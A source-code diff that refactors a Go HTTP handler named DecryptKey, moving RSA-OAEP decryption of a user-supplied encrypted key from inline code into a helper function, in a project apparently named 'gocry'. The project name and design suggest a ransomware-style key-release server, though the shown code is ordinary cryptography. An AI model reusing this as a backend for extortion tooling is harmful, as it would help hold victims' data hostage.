@@ -1,12 +1,7 @@
 package handlers
 
 import (
-	"crypto/rand"
-	"crypto/rsa"
-	"crypto/sha256"
-	"crypto/x509"
 	"encoding/json"
-	"encoding/pem"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -15,6 +10,7 @@ import (
 	"time"
 
 	"github.com/nireo/gocry/server/database"
+	"github.com/nireo/gocry/server/utils"
 )
 
 // DecryptKey takes in the user's encrypted key and removes the RSA encryption on the key.
@@ -32,35 +28,9 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	pemd, err := ioutil.ReadFile("private.pem")
+	out, err := utils.DecryptRSA(id[0], key)
 	if err != nil {
-		http.Error(w, "error reading rsa private key", http.StatusInternalServerError)
-		return
-	}
-
-	// decode the pem data
-	block, _ := pem.Decode(pemd)
-	if block == nil {
-		http.Error(w, "error decoding key data", http.StatusInternalServerError)
-		return
-	}
-
-	// check that the key is of the right type.
-	if got, want := block.Type, "PRIVATE KEY"; got != want {
-		http.Error(w, "unknown key type", http.StatusInternalServerError)
-		return
-	}
-
-	// Decode the RSA private key
-	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
-	if err != nil {
-		http.Error(w, "bad private key", http.StatusInternalServerError)
-		return
-	}
-
-	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("key-"+id[0]))
-	if err != nil {
-		http.Error(w, "error with rsa decrypting", http.StatusInternalServerError)
+		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
 	}
 
